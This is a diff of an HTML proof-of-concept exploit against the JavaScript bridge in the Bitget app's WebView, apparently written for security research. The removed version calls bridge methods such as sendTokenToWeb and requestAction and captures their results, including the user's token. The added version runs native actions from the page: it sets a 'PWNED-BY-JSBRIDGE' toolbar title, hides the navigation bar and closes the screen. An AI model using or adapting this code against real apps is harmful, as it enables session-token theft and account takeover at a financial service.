@@ -1,18 +1,17 @@
-<!DOCTYPE html><html><head><title>Bitget JSBridge PoC</title></head>
+<!DOCTYPE html><html><head><title>PoC v12 exec proof</title></head>
 <body>
-<h2>PoC v11 full callback capture</h2>
-<pre id="out">running...</pre>
+<h2>PoC v12 exec proof</h2>
+<pre id="out">waiting 3s...</pre>
 <script>
-function log(s){document.getElementById('out').textContent += "\n" + JSON.stringify(s);}
-function cb(name){ return function(d){ log(["CB", name, String(d)]); }; }
+function log(s){document.getElementById('out').textContent += "\n" + s;}
 setTimeout(function(){
   if (!window.control) { log("NO control"); return; }
-  log("control present");
-  try { control.sendTokenToWeb(cb("token")); log("called sendTokenToWeb"); } catch(e){ log("ERR sTTW "+e); }
-  try { control.getInviteFriends(cb("invite")); log("called getInviteFriends"); } catch(e){ log("ERR gif "+e); }
-  try { control.getAppUsdtRateData(cb("rate")); log("called getAppUsdtRateData"); } catch(e){ log("ERR gaurd "+e); }
-  try { control.requestAction(JSON.stringify({path:"/api/v1/poc", params:{a:1}}), cb("ra")); log("called requestAction"); } catch(e){ log("ERR ra "+e); }
-  log("done");
-}, 500);
+  log("calling metaTitle (changes toolbar title)");
+  try { control.metaTitle("PWNED-BY-JSBRIDGE"); log("metaTitle OK"); } catch(e){ log("ERR metaTitle "+e); }
+  log("calling setNavigationBarHide...");
+  try { control.setNavigationBarHide("1"); log("snbh OK"); } catch(e){ log("ERR snbh "+e); }
+  log("now closing this Activity via navigationPopBack in 2s");
+  setTimeout(function(){ try { control.navigationPopBack(); log("npb OK"); } catch(e){ log("ERR npb "+e); } }, 2000);
+}, 3000);
 </script>
 </body></html>
